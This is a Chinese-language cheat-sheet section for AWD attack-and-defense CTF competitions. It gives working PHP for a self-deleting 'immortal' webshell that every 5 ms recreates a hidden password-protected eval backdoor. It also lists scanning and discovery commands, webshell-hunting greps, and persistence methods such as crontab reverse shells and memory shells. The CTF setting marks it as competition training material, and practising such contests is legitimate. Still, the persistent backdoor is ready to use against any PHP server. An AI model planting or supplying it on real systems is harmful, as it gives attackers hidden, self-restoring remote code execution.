## 二、持久化 / 权限维持（AWD 必备）

### 2.1 不死马（自重建）★

```php
<?php
ignore_user_abort(true);           // 断开也继续执行
set_time_limit(0);
unlink(__FILE__);                  // 删除自身
$file = '.shell.php';              // 用点开头隐藏
$code = '<?php if(md5($_POST["pass"])=="xxx"){@eval($_POST["cmd"]);}?>';
while (1) {
    file_put_contents($file, $code);
    usleep(5000);                  // 5ms 重建一次
}
```

```bash

```

## 三、AWD 攻防要点

### 3.1 攻击流程

```bash
nmap -sn / -sV / -sS                  # 扫存活 + 服务 + 端口
find / -name *.conf                   # 找配置文件
find / -perm -002                     # 找可写目录
find / -name "*.php" | xargs grep "eval\|system"   # 找现有 webshell
```

### 3.2 防御 / 清除

```bash
# 查杀 webshell
find / -name "*.php" -newer /tmp/timecheck
find / -name "*.php" | xargs grep -l "eval\|assert\|system"
grep -r "flag{" /                            # 整盘搜 flag
```

### 3.3 常用持久化（AWD 得分关键）

* 不死马 + 隐藏文件名
* crontab 定时反弹
* mysqldump 备份 flag
* 内存马
